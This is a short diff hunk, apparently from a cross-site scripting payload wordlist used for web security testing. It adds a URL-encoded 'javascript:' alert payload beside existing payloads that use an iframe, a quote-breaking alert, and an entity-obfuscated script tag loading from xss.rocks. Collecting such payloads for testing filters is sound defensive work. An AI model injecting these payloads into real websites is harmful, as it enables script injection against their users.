@@ -39,3 +39,4 @@ alert\\`1\\`
 <iframe src=http://xss.rocks/scriptlet.html <
 \";alert('XSS');//
 <SCRIPT SRC="http:&#47;&#47;xss.rocks/xss.jpg"></SCRIPT>
+javascript:alert%28/xss/%29
